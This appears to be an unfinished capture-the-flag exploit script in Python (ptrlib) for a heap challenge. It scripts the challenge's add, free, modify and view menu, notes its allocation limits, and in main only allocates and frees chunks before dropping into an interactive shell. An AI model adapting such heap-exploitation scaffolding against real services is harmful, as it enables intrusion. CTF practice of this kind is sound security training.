#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def add(io, size: int, data: bytes):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("input chunk size : ", str(size))
    io.sendlineafter("input chunk data : ", data)


def free(io, index: int):
    io.sendlineafter(">> ", "2")
    io.sendlineafter("input chunk id : ", str(index))


def modify(io, index: int, data: bytes):
    io.sendlineafter(">> ", "3")
    io.sendlineafter("input chunk id : ", str(index))
    io.sendlineafter("modify chunk data(max 40) : ", data)


def view(io, index: int) -> bytes:
    io.sendlineafter(">> ", "4")
    io.sendlineafter("input chunk id : ", str(index))
    data = io.recvline()
    return data


# size must be lower than 0xc7
# uaf: none
# double free: none
# index must be lower than 0x10


def main():
    io = connect()

    add(io, 0x19, b"A")
    add(io, 0x19, b"B")
    add(io, 0x19, b"C")
    free(io, 0)
    free(io, 1)

    input(">>>")
    io.sh()


if __name__ == "__main__":
    main()
